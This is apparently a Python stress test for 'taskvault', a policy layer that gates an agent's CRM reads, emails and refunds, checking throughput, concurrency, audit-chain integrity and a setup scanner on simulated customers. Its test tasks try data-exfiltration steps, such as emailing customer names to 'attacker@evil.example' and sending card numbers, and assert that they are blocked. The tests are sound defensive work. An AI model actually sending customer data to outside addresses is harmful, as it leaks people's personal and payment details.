"""Stress test: throughput, latency, concurrency and big inputs. SIMULATED data only.

    python -m demo.stress            # about a minute
    python -m demo.stress --quick    # a few seconds (used in CI)

Every check asserts correctness as well as timing: no leaks, no cross-customer mix-ups,
audit chains intact, every deposit accounted for.
"""

from __future__ import annotations

import argparse
import csv
import json
import os
import random
import sqlite3
import sys
import tempfile
import threading
import time
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path

from taskvault import AuditLog, Blocked, Policy, Vault

from .__main__ import POLICY
from .world import World


def big_world(n: int) -> World:
    w = World()
    for i in range(1000, 1000 + n):
        w.customers[i] = {"customer_id": i, "name": f"Customer {i}", "email": f"c{i}@example.com",
                          "phone": f"+61 400 {i:06d}"[:15], "address": f"{i} Test St", "plan": "Pro",
                          "card_number": "4111 1111 1111 1111" if i % 2 else "5555 5555 5555 4444"}
    return w


def make(world: World, audit: AuditLog | None = None) -> Vault:
    lock = threading.Lock()

    def send_email(to, subject, body):
        with lock:
            world.outbox.append({"to": to, "subject": subject, "body": body})
        return "sent"

    def refund(card, amount):
        with lock:
            world.refunds.append({"card": card, "amount": amount})
        return "refunded"

    return Vault(Policy.load(POLICY),
                 {"crm.customer": world.get_customer, "docs": world.get_doc, "inbox.ticket": world.get_ticket},
                 {"email.send": send_email, "payments.refund": refund}, audit=audit)


def one_task(vault: Vault, cid: int, attack: bool) -> float:
    t0 = time.perf_counter()
    task = vault.start_task("support_reply", customer_id=cid)
    c = task.read("crm.customer")
    task.act("email.send", to=c["email"], subject="Re: your ticket", body=f"Hi {c['name']}, sorted.")
    task.act("payments.refund", card=c["card_number"], amount=cid % 100)
    if attack:
        for bad in (lambda: task.read("crm.customer", cid + 1),
                    lambda: task.act("email.send", to="attacker@evil.example", subject="x", body=c["name"]),
                    lambda: task.act("email.send", to=c["email"], subject="x", body=c["card_number"])):
            try:
                bad()
                raise AssertionError("an attack got through")
            except Blocked:
                pass
    return time.perf_counter() - t0


def pct(xs, p):
    xs = sorted(xs)
    return xs[min(len(xs) - 1, int(len(xs) * p / 100))] * 1000


def check_outputs(world: World, n: int):
    by_email = {c["email"]: c for c in world.customers.values()}
    assert len(world.outbox) == n and len(world.refunds) == n, (len(world.outbox), len(world.refunds))
    for m in world.outbox:
        c = by_email[m["to"]]
        assert c["name"] in m["body"], m                         # each email went to the right person
    assert not world.leaks(), world.leaks()[:3]


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--quick", action="store_true")
    a = ap.parse_args()
    q = a.quick
    rows = []

    def report(name, value, note=""):
        rows.append((name, value, note))
        print(f"  {name:<52} {value:>14}  {note}", flush=True)

    tmp = Path(tempfile.mkdtemp(prefix="tv-stress-"))
    print("taskvault stress test (SIMULATED data)\n")

    # 1. single-thread throughput and latency
    n = 300 if q else 3000
    world = big_world(n)
    vault = make(world)
    ids = list(world.customers)[-n:]
    times = [one_task(vault, cid, attack=(i % 10 == 0)) for i, cid in enumerate(ids)]
    check_outputs(world, n)
    report("tasks, one thread (read + email + refund)", f"{n / sum(times):,.0f}/s",
           f"p50 {pct(times, 50):.2f} ms, p99 {pct(times, 99):.2f} ms")

    # 2. many threads sharing one vault and one audit file
    n, threads = (400, 8) if q else (4000, 32)
    world = big_world(n)
    audit = AuditLog(tmp / "audit.jsonl")
    vault = make(world, audit)
    ids = list(world.customers)[-n:]
    t0 = time.perf_counter()
    with ThreadPoolExecutor(threads) as ex:
        list(ex.map(lambda p: one_task(vault, p[1], attack=(p[0] % 5 == 0)), enumerate(ids)))
    dt = time.perf_counter() - t0
    check_outputs(world, n)
    reloaded = AuditLog(tmp / "audit.jsonl")
    assert audit.verify() and reloaded.verify() and len(reloaded.entries) == len(audit.entries)
    blocks = len(audit.decisions("block"))
    assert blocks == 3 * len([i for i in range(n) if i % 5 == 0]), blocks
    report(f"tasks, {threads} threads, shared audit file", f"{n / dt:,.0f}/s",
           f"{len(audit.entries):,} audit entries, chain valid, {blocks} attacks blocked")

    # 3. audit log: reload and verify a large file
    t0 = time.perf_counter()
    big = AuditLog(tmp / "audit.jsonl")
    ok = big.verify()
    report("audit log reload + verify", f"{(time.perf_counter() - t0) * 1000:,.0f} ms",
           f"{len(big.entries):,} entries, {os.path.getsize(tmp / 'audit.jsonl') / 1e6:.1f} MB, valid={ok}")
    assert ok

    # 4. big inputs
    world = World()
    vault = make(world)
    for size in ([100_000] if q else [100_000, 1_000_000, 10_000_000]):
        task = vault.start_task("support_reply", customer_id=12)
        c = task.read("crm.customer")
        body = ("lorem ipsum " * (size // 12)) + c["name"]
        t0 = time.perf_counter()
        task.act("email.send", to=c["email"], subject="big", body=body)
        report(f"email with a {size / 1e6:g} MB body", f"{(time.perf_counter() - t0) * 1000:,.0f} ms", "allowed")
        task2 = vault.start_task("support_reply", customer_id=12)
        c2 = task2.read("crm.customer")
        t0 = time.perf_counter()
        try:
            task2.act("email.send", to=c2["email"], subject="big", body=body + c2["card_number"])
            raise AssertionError("placeholder hidden in a big body got through")
        except Blocked:
            pass
        report("  ...same size with a hidden card placeholder", f"{(time.perf_counter() - t0) * 1000:,.0f} ms",
               "blocked")

    # 5. deposit boxes: concurrent writers
    try:
        from taskvault.boxes import BoxDB, BoxStore
        from taskvault.crypto import LocalKeyProvider
        n, threads = (200, 4) if q else (2000, 16)
        keys = LocalKeyProvider(tmp / "v.key")
        errors = []

        def deposit(i):
            try:
                store = BoxStore(BoxDB(str(tmp / "boxes.db")), keys)   # one connection per thread
                store.deposit(f"customer:{i % 50}", "normal", f"field{i}", f"value {i}")
            except Exception as e:  # noqa: BLE001
                errors.append(repr(e))
        t0 = time.perf_counter()
        with ThreadPoolExecutor(threads) as ex:
            list(ex.map(deposit, range(n)))
        dt = time.perf_counter() - t0
        count = sqlite3.connect(tmp / "boxes.db").execute("SELECT count(*) FROM tv_items").fetchone()[0]
        report(f"box deposits, {threads} threads (SQLite)", f"{n / dt:,.0f}/s",
               f"{count}/{n} stored, {len(errors)} errors" + (f" e.g. {errors[0][:60]}" if errors else ""))
        store = BoxStore(BoxDB(str(tmp / "boxes.db")), keys)
        bad = sum(store._read_normal(store.box_id(f"customer:{i % 50}", "normal"),
                                     store._mac("item", store.box_id(f"customer:{i % 50}", "normal"), f"field{i}")[:24],
                                     None) != f"value {i}" for i in range(n))
        report("  ...every deposit read back and decrypted", f"{n - bad}/{n}", "")
        assert count == n and not errors and bad == 0
    except ImportError as e:
        report("box deposits", "skipped", str(e))

    # 6. setup scanner on a large table
    n = 5_000 if q else 100_000
    db = tmp / "crm.db"
    con = sqlite3.connect(db)
    con.execute("CREATE TABLE customers (id INTEGER PRIMARY KEY, name TEXT, email TEXT, phone TEXT, "
                "card_number TEXT, tfn TEXT, notes TEXT)")
    rnd = random.Random(1)
    con.executemany("INSERT INTO customers VALUES (?,?,?,?,?,?,?)",
                    [(i, f"Person {i}", f"p{i}@example.com", f"+61 4{rnd.randint(10**7, 10**8 - 1)}",
                      "4111 1111 1111 1111", "123 456 782", "likes cats") for i in range(n)])
    con.commit()
    con.close()
    csv_path = tmp / "customers.csv"
    with open(csv_path, "w", newline="") as f:
        w = csv.writer(f)
        w.writerow(["id", "name", "email", "card_number"])
        w.writerows([i, f"Person {i}", f"p{i}@example.com", "4111 1111 1111 1111"] for i in range(n))
    from taskvault.cli import main as cli
    out = tmp / "setup"
    t0 = time.perf_counter()
    rc = cli(["setup", "--sqlite", str(db), "--file", str(csv_path), "--dir", str(out), "--domain", "acme.example"])
    report(f"setup scan: {n:,}-row table + {n:,}-row CSV", f"{time.perf_counter() - t0:,.1f} s", f"exit {rc}")
    policy = (out / "taskvault.yaml").read_text()
    assert rc == 0 and "card_number\": secret" in policy and "tfn\": secret" in policy

    print(f"\nall stress checks passed. Temporary files: {tmp}")
    (tmp / "results.json").write_text(json.dumps(rows, indent=1))
    return 0


if __name__ == "__main__":
    sys.exit(main())
